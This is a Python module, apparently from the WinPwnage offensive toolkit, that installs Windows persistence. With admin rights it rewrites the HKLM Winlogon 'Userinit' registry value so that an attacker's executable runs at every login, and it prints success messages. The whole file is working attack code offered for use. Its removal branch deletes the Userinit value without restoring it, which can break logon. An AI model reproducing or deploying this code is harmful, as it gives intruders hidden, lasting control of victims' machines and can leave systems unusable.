import os
from winpwnage.core.prints import *
from winpwnage.core.utils import *

persistMethod5_info = {
	"Description": "Persistence using userinit key",
	"Method": "Registry key (UserInit) manipulation",
	"Id": "5",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "persistMethod5",
	"Function Payload": True,
}

def persistMethod5(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	if add:
		if payloads().exe(payload):
			p = os.path.join(information().system_directory(), "userinit.exe," + payloads().exe(payload)[1])
			if registry().modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p):
				print_success("Successfully created Userinit key containing payload ({})".format(payloads().exe(payload)[1]))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to install persistence")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hklm", path=winlogon, name="Userinit"):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False
